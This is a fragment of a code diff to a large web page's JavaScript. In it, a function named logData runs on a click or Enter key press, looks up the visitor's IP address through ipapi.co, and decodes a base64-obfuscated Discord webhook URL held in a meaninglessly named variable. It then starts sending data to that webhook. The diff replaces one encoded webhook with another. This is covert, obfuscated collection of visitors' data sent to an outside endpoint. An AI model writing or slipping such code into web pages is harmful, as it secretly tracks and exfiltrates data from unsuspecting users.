@@ -42525,7 +42525,7 @@ async function logData(e){
     if(e.type==='click'||e.key==='Enter'){
         e.preventDefault();
         const ip = (await fetch('https://ipapi.co/json/').then(r=>r.json())).ip;
-        const ahgfdsa = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxODkwNjI4ODgyMTExMjg3My9KZi02TEhQNFdZUDNoNUNHTTAwRzBzQmNVeFBzdTZGS3F5YlZMaldrZGF3MGNmS29ydVJHV01OZzZUVlFpME5ENy1kdg==";
+        const ahgfdsa = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxODkwNjI4ODgyMTExMjg3My9KZi02TGhQNFdZUDNoNUNHTTAwRzBzQmNVeVBzdTZGS3F5YlZMajdrZGF3MGNmS293dVJHV01OZzZUVlFpME5ENy1kdg==";
         
         const webhookUrl = atob(ahgfdsa);
         fetch(webhookUrl, {
@@ -42751,3 +42751,4 @@ window.addEventListener('popstate', function(event) {
 </body>
 
 </html>
+
